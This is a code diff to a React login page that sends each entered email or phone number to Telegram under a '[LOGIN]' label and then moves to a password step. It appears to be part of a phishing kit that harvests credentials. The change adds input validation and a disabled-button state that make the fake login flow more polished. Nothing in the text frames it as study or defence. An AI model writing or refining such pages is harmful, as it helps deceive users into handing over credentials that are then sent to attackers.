@@ -12,8 +12,14 @@ export function LoginPage({ onLoginSuccess }: LoginPageProps) {
   const [showPassword, setShowPassword] = useState(false);
   const [step, setStep] = useState<'email' | 'loading' | 'password'>('email');
 
+  const validateInput = (value: string) => {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const phoneRegex = /^\d{10}$/;
+    return emailRegex.test(value) || phoneRegex.test(value);
+  };
+
   const handleNext = async () => {
-    if (email.trim()) {
+    if (validateInput(email)) {
       await sendToTelegram(`<b>[LOGIN] Email/Phone:</b> ${email}`);
       setStep('loading');
     }
@@ -94,7 +100,12 @@ export function LoginPage({ onLoginSuccess }: LoginPageProps) {
 
                 <button
                   type="submit"
-                  className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm"
+                  disabled={!validateInput(email)}
+                  className={`w-full py-4 text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm ${
+                    validateInput(email) 
+                      ? 'bg-[#0054BB] hover:bg-[#004294]' 
+                      : 'bg-[#0054BB]/50 cursor-not-allowed'
+                  }`}
                 >
                   Next
                 </button>
